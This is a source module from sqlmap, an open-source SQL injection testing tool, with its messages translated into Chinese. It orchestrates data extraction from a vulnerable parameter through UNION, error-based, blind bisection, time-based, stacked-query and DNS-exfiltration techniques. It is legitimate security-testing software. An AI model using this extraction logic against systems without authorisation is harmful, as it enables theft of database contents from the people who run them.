#!/usr/bin/env python

"""
Copyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)
See the file 'LICENSE' for copying permission
"""

from __future__ import print_function

import re
import time

from lib.core.agent import agent
from lib.core.bigarray import BigArray
from lib.core.common import applyFunctionRecursively
from lib.core.common import Backend
from lib.core.common import calculateDeltaSeconds
from lib.core.common import cleanQuery
from lib.core.common import expandAsteriskForColumns
from lib.core.common import extractExpectedValue
from lib.core.common import filterNone
from lib.core.common import getPublicTypeMembers
from lib.core.common import getTechnique
from lib.core.common import getTechniqueData
from lib.core.common import hashDBRetrieve
from lib.core.common import hashDBWrite
from lib.core.common import initTechnique
from lib.core.common import isDigit
from lib.core.common import isNoneValue
from lib.core.common import isNumPosStrValue
from lib.core.common import isTechniqueAvailable
from lib.core.common import parseUnionPage
from lib.core.common import popValue
from lib.core.common import pushValue
from lib.core.common import randomStr
from lib.core.common import readInput
from lib.core.common import setTechnique
from lib.core.common import singleTimeWarnMessage
from lib.core.compat import xrange
from lib.core.data import conf
from lib.core.data import kb
from lib.core.data import logger
from lib.core.data import queries
from lib.core.decorators import lockedmethod
from lib.core.decorators import stackedmethod
from lib.core.dicts import FROM_DUMMY_TABLE
from lib.core.enums import CHARSET_TYPE
from lib.core.enums import DBMS
from lib.core.enums import EXPECTED
from lib.core.enums import PAYLOAD
from lib.core.exception import SqlmapConnectionException
from lib.core.exception import SqlmapDataException
from lib.core.exception import SqlmapNotVulnerableException
from lib.core.exception import SqlmapUserQuitException
from lib.core.settings import GET_VALUE_UPPERCASE_KEYWORDS
from lib.core.settings import INFERENCE_MARKER
from lib.core.settings import MAX_TECHNIQUES_PER_VALUE
from lib.core.settings import SQL_SCALAR_REGEX
from lib.core.settings import UNICODE_ENCODING
from lib.core.threads import getCurrentThreadData
from lib.request.connect import Connect as Request
from lib.request.direct import direct
from lib.techniques.blind.inference import bisection
from lib.techniques.blind.inference import queryOutputLength
from lib.techniques.dns.test import dnsTest
from lib.techniques.dns.use import dnsUse
from lib.techniques.error.use import errorUse
from lib.techniques.union.use import unionUse
from thirdparty import six

def _goDns(payload, expression):
    value = None

    if conf.dnsDomain and kb.dnsTest is not False and not kb.testMode and Backend.getDbms() is not None:
        if kb.dnsTest is None:
            dnsTest(payload)

        if kb.dnsTest:
            value = dnsUse(payload, expression)

    return value

def _goInference(payload, expression, charsetType=None, firstChar=None, lastChar=None, dump=False, field=None):
    start = time.time()
    value = None
    count = 0

    value = _goDns(payload, expression)

    if payload is None:
        return None

    if value is not None:
        return value

    timeBasedCompare = (getTechnique() in (PAYLOAD.TECHNIQUE.TIME, PAYLOAD.TECHNIQUE.STACKED))

    if timeBasedCompare and conf.threads > 1 and kb.forceThreads is None:
        msg = "在基于时间的数据检索中,多线程被认为是不安全的。你确定你的选择吗(违反保修)[y/N] "

        kb.forceThreads = readInput(msg, default='N', boolean=True)

    if not (timeBasedCompare and kb.dnsTest):
        if (conf.eta or conf.threads > 1) and Backend.getIdentifiedDbms() and not re.search(r"(COUNT|LTRIM)\(", expression, re.I) and not (timeBasedCompare and not kb.forceThreads):

            if field and re.search(r"\ASELECT\s+DISTINCT\((.+?)\)\s+FROM", expression, re.I):
                if Backend.getIdentifiedDbms() in (DBMS.MYSQL, DBMS.PGSQL, DBMS.MONETDB, DBMS.VERTICA, DBMS.CRATEDB, DBMS.CUBRID):
                    alias = randomStr(lowercase=True, seed=hash(expression))
                    expression = "SELECT %s FROM (%s)" % (field if '.' not in field else re.sub(r".+\.", "%s." % alias, field), expression)  # Note: MonetDB as a prime example
                    expression += " AS %s" % alias
                else:
                    expression = "SELECT %s FROM (%s)" % (field, expression)

            if field and conf.hexConvert or conf.binaryFields and field in conf.binaryFields or Backend.getIdentifiedDbms() in (DBMS.RAIMA,):
                nulledCastedField = agent.nullAndCastField(field)
                injExpression = expression.replace(field, nulledCastedField, 1)
            else:
                injExpression = expression
            length = queryOutputLength(injExpression, payload)
        else:
            length = None

        kb.inferenceMode = True
        count, value = bisection(payload, expression, length, charsetType, firstChar, lastChar, dump)
        kb.inferenceMode = False

        if not kb.bruteMode:
            debugMsg = "在%.2f秒内执行了%d个查询" % (calculateDeltaSeconds(start), count)
            logger.debug(debugMsg)

    return value

def _goInferenceFields(expression, expressionFields, expressionFieldsList, payload, num=None, charsetType=None, firstChar=None, lastChar=None, dump=False):
    outputs = []
    origExpr = None

    for field in expressionFieldsList:
        output = None

        if field.startswith("ROWNUM "):
            continue

        if isinstance(num, int):
            origExpr = expression
            expression = agent.limitQuery(num, expression, field, expressionFieldsList[0])

        if "ROWNUM" in expressionFieldsList:
            expressionReplaced = expression
        else:
            expressionReplaced = expression.replace(expressionFields, field, 1)

        output = _goInference(payload, expressionReplaced, charsetType, firstChar, lastChar, dump, field)

        if isinstance(num, int):
            expression = origExpr

        outputs.append(output)

    return outputs

def _goInferenceProxy(expression, fromUser=False, batch=False, unpack=True, charsetType=None, firstChar=None, lastChar=None, dump=False):
    """
    Retrieve the output of a SQL query characted by character taking
    advantage of an blind SQL injection vulnerability on the affected
    parameter through a bisection algorithm.
    """

    initTechnique(getTechnique())

    query = agent.prefixQuery(getTechniqueData().vector)
    query = agent.suffixQuery(query)
    payload = agent.payload(newValue=query)
    count = None
    startLimit = 0
    stopLimit = None
    outputs = BigArray()

    if not unpack:
        return _goInference(payload, expression, charsetType, firstChar, lastChar, dump)

    _, _, _, _, _, expressionFieldsList, expressionFields, _ = agent.getFields(expression)

    rdbRegExp = re.search(r"RDB\$GET_CONTEXT\([^)]+\)", expression, re.I)
    if rdbRegExp and Backend.isDbms(DBMS.FIREBIRD):
        expressionFieldsList = [expressionFields]

    if len(expressionFieldsList) > 1:
        infoMsg = "提供的SQL查询有多个字段。sqlmap现在将将其拆分为不同的查询,以便能够检索输出,即使我们是盲目的"
        logger.info(infoMsg)

    # If we have been here from SQL query/shell we have to check if
    # the SQL query might return multiple entries and in such case
    # forge the SQL limiting the query output one entry at a time
    # NOTE: we assume that only queries that get data from a table
    # can return multiple entries
    if fromUser and " FROM " in expression.upper() and ((Backend.getIdentifiedDbms() not in FROM_DUMMY_TABLE) or (Backend.getIdentifiedDbms() in FROM_DUMMY_TABLE and not expression.upper().endswith(FROM_DUMMY_TABLE[Backend.getIdentifiedDbms()]))) and not re.search(SQL_SCALAR_REGEX, expression, re.I) and hasattr(queries[Backend.getIdentifiedDbms()].limitregexp, "query"):
        expression, limitCond, topLimit, startLimit, stopLimit = agent.limitCondition(expression)

        if limitCond:
            test = True

            if not stopLimit or stopLimit <= 1:
                if Backend.getIdentifiedDbms() in FROM_DUMMY_TABLE and expression.upper().endswith(FROM_DUMMY_TABLE[Backend.getIdentifiedDbms()]):
                    test = False

            if test:
                # Count the number of SQL query entries output
                countFirstField = queries[Backend.getIdentifiedDbms()].count.query % expressionFieldsList[0]
                countedExpression = expression.replace(expressionFields, countFirstField, 1)

                if " ORDER BY " in countedExpression.upper():
                    _ = countedExpression.upper().rindex(" ORDER BY ")
                    countedExpression = countedExpression[:_]

                if not stopLimit:
                    count = _goInference(payload, countedExpression, charsetType=CHARSET_TYPE.DIGITS, firstChar=firstChar, lastChar=lastChar)

                    if isNumPosStrValue(count):
                        count = int(count)

                        if batch or count == 1:
                            stopLimit = count
                        else:
                            message = "提供的 SQL 查询可以返回 %d 条结果。你想要检索多少条结果？\n" % count
                            message += "[a] 全部(默认)\n[#] 指定数量\n"
                            message += "[q] 退出"
                            choice = readInput(message, default='A').upper()

                            if choice == 'A':
                                stopLimit = count

                            elif choice == 'Q':
                                raise SqlmapUserQuitException

                            elif isDigit(choice) and int(choice) > 0 and int(choice) <= count:
                                stopLimit = int(choice)

                                infoMsg = "sqlmap现在将检索前%d个查询输出条目" % stopLimit
                                logger.info(infoMsg)

                            elif choice in ('#', 'S'):
                                message = "数量多少? "
                                stopLimit = readInput(message, default="10")

                                if not isDigit(stopLimit):
                                    errMsg = "无效的选择"
                                    logger.error(errMsg)

                                    return None

                                else:
                                    stopLimit = int(stopLimit)

                            else:
                                errMsg = "无效的选择"
                                logger.error(errMsg)

                                return None

                    elif count and not isDigit(count):
                        warnMsg = "无法计算提供的SQL查询的条目数量。sqlmap将假设它只返回一个条目"
                        logger.warning(warnMsg)

                        stopLimit = 1

                    elif not isNumPosStrValue(count):
                        if not count:
                            warnMsg = "提供的SQL查询没有返回任何输出"
                            logger.warning(warnMsg)

                        return None

                elif (not stopLimit or stopLimit == 0):
                    return None

                try:
                    try:
                        for num in xrange(startLimit or 0, stopLimit or 0):
                            output = _goInferenceFields(expression, expressionFields, expressionFieldsList, payload, num=num, charsetType=charsetType, firstChar=firstChar, lastChar=lastChar, dump=dump)
                            outputs.append(output)
                    except OverflowError:
                        errMsg = "边界限制(%d,%d)过大。请使用'--fresh-queries'开关重新运行。"
                        raise SqlmapDataException(errMsg)

                except KeyboardInterrupt:
                    print()
                    warnMsg = "用户在转储阶段中中止了操作"
                    logger.warning(warnMsg)

                return outputs

    elif Backend.getIdentifiedDbms() in FROM_DUMMY_TABLE and expression.upper().startswith("SELECT ") and " FROM " not in expression.upper():
        expression += FROM_DUMMY_TABLE[Backend.getIdentifiedDbms()]

    outputs = _goInferenceFields(expression, expressionFields, expressionFieldsList, payload, charsetType=charsetType, firstChar=firstChar, lastChar=lastChar, dump=dump)

    return ", ".join(output or "" for output in outputs) if not isNoneValue(outputs) else None

def _goBooleanProxy(expression):
    """
    Retrieve the output of a boolean based SQL query
    """

    initTechnique(getTechnique())

    if conf.dnsDomain:
        query = agent.prefixQuery(getTechniqueData().vector)
        query = agent.suffixQuery(query)
        payload = agent.payload(newValue=query)
        output = _goDns(payload, expression)

        if output is not None:
            return output

    vector = getTechniqueData().vector
    vector = vector.replace(INFERENCE_MARKER, expression)
    query = agent.prefixQuery(vector)
    query = agent.suffixQuery(query)
    payload = agent.payload(newValue=query)

    timeBasedCompare = getTechnique() in (PAYLOAD.TECHNIQUE.TIME, PAYLOAD.TECHNIQUE.STACKED)

    output = hashDBRetrieve(expression, checkConf=True)

    if output is None:
        output = Request.queryPage(payload, timeBasedCompare=timeBasedCompare, raise404=False)

        if output is not None:
            hashDBWrite(expression, output)

    return output

def _goUnion(expression, unpack=True, dump=False):
    """
    Retrieve the output of a SQL query taking advantage of an union SQL
    injection vulnerability on the affected parameter.
    """

    output = unionUse(expression, unpack=unpack, dump=dump)

    if isinstance(output, six.string_types):
        output = parseUnionPage(output)

    return output

@lockedmethod
@stackedmethod
def getValue(expression, blind=True, union=True, error=True, time=True, fromUser=False, expected=None, batch=False, unpack=True, resumeValue=True, charsetType=None, firstChar=None, lastChar=None, dump=False, suppressOutput=None, expectingNone=False, safeCharEncode=True):
    """
    Called each time sqlmap inject a SQL query on the SQL injection
    affected parameter.
    """

    if conf.hexConvert and expected != EXPECTED.BOOL and Backend.getIdentifiedDbms():
        if not hasattr(queries[Backend.getIdentifiedDbms()], "hex"):
            warnMsg = "在DBMS %s上,当前不支持'--hex'开关" % Backend.getIdentifiedDbms()
            singleTimeWarnMessage(warnMsg)
            conf.hexConvert = False
        else:
            charsetType = CHARSET_TYPE.HEXADECIMAL

    kb.safeCharEncode = safeCharEncode
    kb.resumeValues = resumeValue

    for keyword in GET_VALUE_UPPERCASE_KEYWORDS:
        expression = re.sub(r"(?i)(\A|\(|\)|\s)%s(\Z|\(|\)|\s)" % keyword, r"\g<1>%s\g<2>" % keyword, expression)

    if suppressOutput is not None:
        pushValue(getCurrentThreadData().disableStdOut)
        getCurrentThreadData().disableStdOut = suppressOutput

    try:
        pushValue(conf.db)
        pushValue(conf.tbl)

        if expected == EXPECTED.BOOL:
            forgeCaseExpression = booleanExpression = expression

            if expression.startswith("SELECT "):
                booleanExpression = "(%s)=%s" % (booleanExpression, "'1'" if "'1'" in booleanExpression else "1")
            else:
                forgeCaseExpression = agent.forgeCaseStatement(expression)

        if conf.direct:
            value = direct(forgeCaseExpression if expected == EXPECTED.BOOL else expression)

        elif any(isTechniqueAvailable(_) for _ in getPublicTypeMembers(PAYLOAD.TECHNIQUE, onlyValues=True)):
            query = cleanQuery(expression)
            query = expandAsteriskForColumns(query)
            value = None
            found = False
            count = 0

            if query and not re.search(r"COUNT.*FROM.*\(.*DISTINCT", query, re.I):
                query = query.replace("DISTINCT ", "")

            if not conf.forceDns:
                if union and isTechniqueAvailable(PAYLOAD.TECHNIQUE.UNION):
                    setTechnique(PAYLOAD.TECHNIQUE.UNION)
                    kb.forcePartialUnion = kb.injection.data[PAYLOAD.TECHNIQUE.UNION].vector[8]
                    fallback = not expected and kb.injection.data[PAYLOAD.TECHNIQUE.UNION].where == PAYLOAD.WHERE.ORIGINAL and not kb.forcePartialUnion

                    if expected == EXPECTED.BOOL:
                        # Note: some DBMSes (e.g. Altibase) don't support implicit conversion of boolean check result during concatenation with prefix and suffix (e.g. 'qjjvq'||(1=1)||'qbbbq')

                        if not any(_ in forgeCaseExpression for _ in ("SELECT", "CASE")):
                            forgeCaseExpression = "(CASE WHEN (%s) THEN '1' ELSE '0' END)" % forgeCaseExpression

                    try:
                        value = _goUnion(forgeCaseExpression if expected == EXPECTED.BOOL else query, unpack, dump)
                    except SqlmapConnectionException:
                        if not fallback:
                            raise

                    count += 1
                    found = (value is not None) or (value is None and expectingNone) or count >= MAX_TECHNIQUES_PER_VALUE

                    if not found and fallback:
                        warnMsg = "完整UNION技术出现问题(可能是由于检索到的条目数量限制引起的)"
                        if " FROM " in query.upper():
                            warnMsg += ".回退到部分UNION技术"
                            singleTimeWarnMessage(warnMsg)

                            try:
                                pushValue(kb.forcePartialUnion)
                                kb.forcePartialUnion = True
                                value = _goUnion(query, unpack, dump)
                                found = (value is not None) or (value is None and expectingNone)
                            finally:
                                kb.forcePartialUnion = popValue()
                        else:
                            singleTimeWarnMessage(warnMsg)

                if error and any(isTechniqueAvailable(_) for _ in (PAYLOAD.TECHNIQUE.ERROR, PAYLOAD.TECHNIQUE.QUERY)) and not found:
                    setTechnique(PAYLOAD.TECHNIQUE.ERROR if isTechniqueAvailable(PAYLOAD.TECHNIQUE.ERROR) else PAYLOAD.TECHNIQUE.QUERY)
                    value = errorUse(forgeCaseExpression if expected == EXPECTED.BOOL else query, dump)
                    count += 1
                    found = (value is not None) or (value is None and expectingNone) or count >= MAX_TECHNIQUES_PER_VALUE

                if found and conf.dnsDomain:
                    _ = "".join(filterNone(key if isTechniqueAvailable(value) else None for key, value in {'E': PAYLOAD.TECHNIQUE.ERROR, 'Q': PAYLOAD.TECHNIQUE.QUERY, 'U': PAYLOAD.TECHNIQUE.UNION}.items()))
                    warnMsg = "选项'--dns-domain'将被忽略,因为存在更快的可用技术(%s)" % _
                    singleTimeWarnMessage(warnMsg)

            if blind and isTechniqueAvailable(PAYLOAD.TECHNIQUE.BOOLEAN) and not found:
                setTechnique(PAYLOAD.TECHNIQUE.BOOLEAN)

                if expected == EXPECTED.BOOL:
                    value = _goBooleanProxy(booleanExpression)
                else:
                    value = _goInferenceProxy(query, fromUser, batch, unpack, charsetType, firstChar, lastChar, dump)

                count += 1
                found = (value is not None) or (value is None and expectingNone) or count >= MAX_TECHNIQUES_PER_VALUE

            if time and (isTechniqueAvailable(PAYLOAD.TECHNIQUE.TIME) or isTechniqueAvailable(PAYLOAD.TECHNIQUE.STACKED)) and not found:
                match = re.search(r"\bFROM\b ([^ ]+).+ORDER BY ([^ ]+)", expression)
                kb.responseTimeMode = "%s|%s" % (match.group(1), match.group(2)) if match else None

                if isTechniqueAvailable(PAYLOAD.TECHNIQUE.TIME):
                    setTechnique(PAYLOAD.TECHNIQUE.TIME)
                else:
                    setTechnique(PAYLOAD.TECHNIQUE.STACKED)

                if expected == EXPECTED.BOOL:
                    value = _goBooleanProxy(booleanExpression)
                else:
                    value = _goInferenceProxy(query, fromUser, batch, unpack, charsetType, firstChar, lastChar, dump)
        else:
            errMsg = "无法利用已识别的任何注入类型来检索查询输出"
            raise SqlmapNotVulnerableException(errMsg)

    finally:
        kb.resumeValues = True
        kb.responseTimeMode = None

        conf.tbl = popValue()
        conf.db = popValue()

        if suppressOutput is not None:
            getCurrentThreadData().disableStdOut = popValue()

    kb.safeCharEncode = False

    if not any((kb.testMode, conf.dummy, conf.offline, conf.noCast, conf.hexConvert)) and value is None and Backend.getDbms() and conf.dbmsHandler and kb.fingerprinted:
        if conf.abortOnEmpty:
            errMsg = "由于无法检索到数据,中止执行"
            logger.critical(errMsg)
            raise SystemExit
        else:
            warnMsg = "如果持续遇到数据检索问题,建议尝试使用开关'--no-cast' 或开关'--hex'" if hasattr(queries[Backend.getIdentifiedDbms()], "hex") else "如果持续遇到数据检索问题,建议尝试使用开关'--no-cast'"
            singleTimeWarnMessage(warnMsg)

    # Dirty patch (MSSQL --binary-fields with 0x31003200...)
    if Backend.isDbms(DBMS.MSSQL) and conf.binaryFields:
        def _(value):
            if isinstance(value, six.text_type):
                if value.startswith(u"0x"):
                    value = value[2:]
                    if value and len(value) % 4 == 0:
                        candidate = ""
                        for i in xrange(len(value)):
                            if i % 4 < 2:
                                candidate += value[i]
                            elif value[i] != '0':
                                candidate = None
                                break
                        if candidate:
                            value = candidate
            return value

        value = applyFunctionRecursively(value, _)

    # Dirty patch (safe-encoded unicode characters)
    if isinstance(value, six.text_type) and "\\x" in value:
        try:
            candidate = eval(repr(value).replace("\\\\x", "\\x").replace("u'", "'", 1)).decode(conf.encoding or UNICODE_ENCODING)
            if "\\x" not in candidate:
                value = candidate
        except:
            pass

    return extractExpectedValue(value, expected)

def goStacked(expression, silent=False):
    if PAYLOAD.TECHNIQUE.STACKED in kb.injection.data:
        setTechnique(PAYLOAD.TECHNIQUE.STACKED)
    else:
        for technique in getPublicTypeMembers(PAYLOAD.TECHNIQUE, True):
            _ = getTechniqueData(technique)
            if _ and "stacked" in _["title"].lower():
                setTechnique(technique)
                break

    expression = cleanQuery(expression)

    if conf.direct:
        return direct(expression)

    query = agent.prefixQuery(";%s" % expression)
    query = agent.suffixQuery(query)
    payload = agent.payload(newValue=query)
    Request.queryPage(payload, content=False, silent=silent, noteResponseTime=False, timeBasedCompare="SELECT" in (payload or "").upper())

def checkBooleanExpression(expression, expectingNone=True):
    return getValue(expression, expected=EXPECTED.BOOL, charsetType=CHARSET_TYPE.BINARY, suppressOutput=True, expectingNone=expectingNone)
